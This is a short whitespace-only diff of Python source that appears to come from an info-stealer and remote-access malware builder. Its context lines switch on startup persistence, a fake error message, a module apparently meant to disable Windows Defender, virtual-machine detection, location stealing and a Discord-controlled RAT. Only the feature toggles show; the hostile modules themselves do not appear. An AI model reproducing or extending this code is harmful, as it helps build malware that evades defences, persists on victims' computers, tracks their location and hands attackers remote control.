@@ -46,10 +46,10 @@ if cc.get_fake_error() is True:
 
 if cc.get_start_up() is True:
     startup.start_up()
-    
+
 if cc.get_defenderfucker() is True:
     import defenderfucker
-    
+
 if cc.get_vmdetection() is True:
     import vmdetect
 
@@ -868,4 +868,3 @@ if cc.get_location_stealing() is True:
 
 if cc.get_discord_rat() is True:
     rat.run_rat()
-    
